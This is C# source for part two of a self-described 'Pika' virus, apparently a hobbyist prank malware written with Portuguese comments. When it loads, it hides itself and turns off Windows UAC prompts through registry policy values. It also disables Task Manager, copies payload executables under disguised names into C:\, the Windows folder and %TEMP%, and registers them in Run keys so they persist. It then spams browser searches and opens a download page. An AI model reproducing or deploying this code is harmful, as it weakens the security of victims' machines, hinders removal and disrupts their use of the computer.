using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Media;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Virus_Pika__By_Waguinho_
{
    //PARTE 02 + SPAM DE PESQUISAS NO GOOGLE
    public partial class PikaVirus02 : Form
    {
        int timeR = 120;

       

        public PikaVirus02()
        {
            InitializeComponent();
            
        }

        private async void PikaVirus02_Load(object sender, EventArgs e)
        {
            string dirtempa = @"C:\Program Files\temp";

            if (File.Exists(dirtempa + @"\check.ini") == true)

            {
                timeR = -2;
            }


            this.Hide();
            RegistryKey lua = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
            lua.SetValue("EnableLUA", 0, RegistryValueKind.DWord);
            
            RegistryKey behav = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
            behav.SetValue("ConsentPromptBehaviorAdmin",0,RegistryValueKind.DWord);

            RegistryKey filter = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
            filter.SetValue("FilterAdministratorToken", 1, RegistryValueKind.DWord);

            RegistryKey ini = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run");
            ini.SetValue("VirusPika.exe", @"c:\Program Files\Temp\Pika.exe");

            RegistryKey fcl = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run");
            fcl.SetValue("fcls", @"c:\Program Files\Temp\fcls.exe");

            RegistryKey taskmgr = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
            taskmgr.SetValue("DisableTaskMgr", 1, RegistryValueKind.DWord);

            // arquivo responsável pelo virus iniciar sem a tela de introdução ao reiniciar a máquina.
            string dirtemp = @"C:\Program Files\temp";
            string windows = @"C:\windows";
            string c = @"C:\";
            string apptemp = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\Temp";
           
            
            if (File.Exists(dirtemp + @"\check.ini") == false)

            {
                File.Create(dirtemp + @"\check.ini");

                //CÓPIAS DO ARQUIVO [CHK.exe]

                //COPIA PARA C:\
                File.Copy(dirtemp + @"\chk.exe", c + @"cuL.exe",true);
                //COPIA PARA WINDOWS
                File.Copy(dirtemp + @"\chk.exe", windows + @"\K7.exe",true);
                //COPIA PARA %TEMP%
                File.Copy(dirtemp + @"\chk.exe", apptemp + @"\KKK.exe",true);

                //CÓPIAS DO ARQUIVO [PIKA.EXE]

                //COPIA PARA C:\
                File.Copy(dirtemp + @"\pika.exe", c + @"lol.exe", true);
                //COPIA PARA WINDOWS
                File.Copy(dirtemp + @"\pika.exe", windows + @"\trash.exe", true);
                //COPIA PARA %TEMP%
                File.Copy(dirtemp + @"\pika.exe", apptemp + @"\joke.exe", true);

                //CÓPIAS DO ARQUIVO [RBSOD.EXE]

                //COPIA PARA C:\
                File.Copy(dirtemp + @"\RBSOD.exe", c + @"NOPE.exe", true);
                //COPIA PARA WINDOWS
                File.Copy(dirtemp + @"\RBSOD.exe", windows + @"\DTH.exe", true);
                //COPIA PARA %TEMP%
                File.Copy(dirtemp + @"\RBSOD.exe", apptemp + @"\fds.exe", true);

                // CHECK INICIALIZAR

                RegistryKey chk = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run");
                chk.SetValue("chk", @"c:\Program Files\Temp\chk.exe");

                RegistryKey k7 = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run");
                k7.SetValue("K7", windows + @"\K7.exe");

                RegistryKey cuL = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run");
                cuL.SetValue("cuL", c + @"cuL.exe");

                RegistryKey kkk = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run");
                kkk.SetValue("kkk", apptemp + @"\kkk.exe");

            }

            
            await Task.Delay(5000);
            
            Random delay = new Random();
           // pesquisas em time aleatório
            Process.Start("https://www.google.com/search?client=opera-gx&q=baidu+antivirus&sourceid=opera&ie=UTF-8&oe=UTF-8");

            await Task.Delay(delay.Next(5000, 15000));

            Process.Start("https://www.google.com/search?q=pc+optimizer+pro&client=opera-gx&hs=KXd&sca_esv=f8e627ae2765b515&sxsrf=ACQVn0-rkyJKtzQWE9xZ5lpCEIQ72LypZQ%3A1711329950937&ei=ntIAZsTmOK_Z1sQPzvOMkAk&udm=&oq=pc+o&gs_lp=Egxnd3Mtd2l6LXNlcnAiBHBjIG8qAggAMgoQIxiABBiKBRgnMgUQABiABDIFEAAYgAQyBRAAGIAEMgUQABiABDIFEAAYgAQyBRAAGIAEMgUQABiABDIFEAAYgAQyBRAAGIAESKvqAVAAWJLgAXAIeAGQAQKYAd4EoAHMHqoBCzEuOC4yLjMuMS4xuAEByAEA-AEBmAIVoALkFqgCEcICBBAjGCfCAgoQLhiABBiKBRgnwgIKEAAYgAQYigUYQ8ICEBAuGIAEGIoFGEMYxwEY0QPCAg4QLhiABBixAxjHARjRA8ICCxAAGIAEGLEDGIMBwgIIEAAYgAQYsQPCAggQLhiABBixA8ICDhAAGIAEGIoFGLEDGIMBwgIIEC4YgAQY1ALCAgcQIxjqAhgnwgITEAAYgAQYigUYQxjqAhi0AtgBAcICHBAuGIAEGIoFGEMYxwEY0QMYyAMY6gIYtALYAQLCAhMQLhiABBiKBRhDGLEDGMcBGNEDwgIQEAAYgAQYigUYQxixAxiDAcICERAuGIAEGLEDGIMBGMcBGNEDwgIOEC4YgAQYigUYsQMYgwGYAw-6BgYIARABGAG6BgYIAhABGAiSBwk5LjcuMi4xLjKgB9fbAQ&sclient=gws-wiz-serp");

            await Task.Delay(delay.Next(5000, 15000));

            Process.Start("https://www.google.com/search?q=voce+gosta+de+paçoca&client=opera-gx&hs=8Dy&sca_esv=f8e627ae2765b515&sxsrf=ACQVn089N4KL-fePyvhur597QNJfdPr6Ag%3A1711330043070&ei=-9IAZuXwA7ja1sQPor6i8AE&udm=&oq=você+gosta+de+pa&gs_lp=Egxnd3Mtd2l6LXNlcnAiEXZvY8OqIGdvc3RhIGRlIHBhKgIIADIFEAAYgAQyBRAAGIAEMgUQABiABDIFEAAYgAQyBRAAGIAEMgUQABiABDIGEAAYFhgeMggQABgWGB4YCjIGEAAYFhgeMgYQABgWGB5IqTBQAFjeH3AAeAGQAQCYAf8BoAGbFKoBBjAuMTIuNLgBAcgBAPgBAZgCEKAC2RXCAgoQIxiABBiKBRgnwgIIEC4YgAQYsQPCAg4QLhiABBixAxjHARjRA8ICCBAAGIAEGLEDwgIOEC4YgAQYigUYsQMYgwHCAgsQLhiABBixAxiDAcICCxAAGIAEGLEDGIMBwgIKEAAYgAQYigUYQ8ICFhAuGIAEGIoFGEMYsQMYgwEYxwEY0QPCAhEQLhiABBixAxiDARjHARjRA8ICChAuGEMYgAQYigXCAg0QABiABBiKBRhDGLEDwgIMEAAYgAQYigUYQxgKwgIKEC4YgAQYigUYQ8ICGRAuGIAEGIoFGEMYlwUY3AQY3gQY4ATYAQHCAgUQLhiABJgDALoGBggBEAEYFJIHBjAuMTIuNKAHw6sB&sclient=gws-wiz-serp");

            await Task.Delay(delay.Next(5000, 15000));

            Process.Start("https://www.google.com/search?q=onde+fica+o+cu+da+cobra%3F&client=opera-gx&sca_esv=f8e627ae2765b515&sxsrf=ACQVn0_yZajFNo4PN50bl0fZ1AvGKFypkg%3A1711330343888&ei=J9QAZr_ONazI1sQPu_6i2AE&udm=&ved=0ahUKEwj__fWpoo6FAxUspJUCHTu_CBsQ4dUDCBA&uact=5&oq=onde+fica+o+cu+da+cobra%3F&gs_lp=Egxnd3Mtd2l6LXNlcnAiGG9uZGUgZmljYSBvIGN1IGRhIGNvYnJhP0iNP1AAWJs6cAB4AZABAZgBvAOgAf8bqgEKMC4xMS41LjEuMbgBA8gBAPgBAZgCCKAC2A7CAgUQABiABMICCBAAGIAEGLEDwgIOEAAYgAQYigUYsQMYgwGYAwCSBwkwLjQuMi4xLjGgB68x&sclient=gws-wiz-serp");
            
            await Task.Delay(delay.Next(5000, 15000));

            Process.Start("https://chromium.br.uptodown.com/windows/post-download/1001134644");
            await Task.Delay(delay.Next(5000, 15000));

            Process.Start("https://www.google.com/search?client=opera-gx&q=trojan+worm+locker&sourceid=opera&ie=UTF-8&oe=UTF-8");
            await Task.Delay(delay.Next(5000, 15000));
        }

        private void Desligar120_Tick(object sender, EventArgs e)
        {
           
         
        }
    }
}
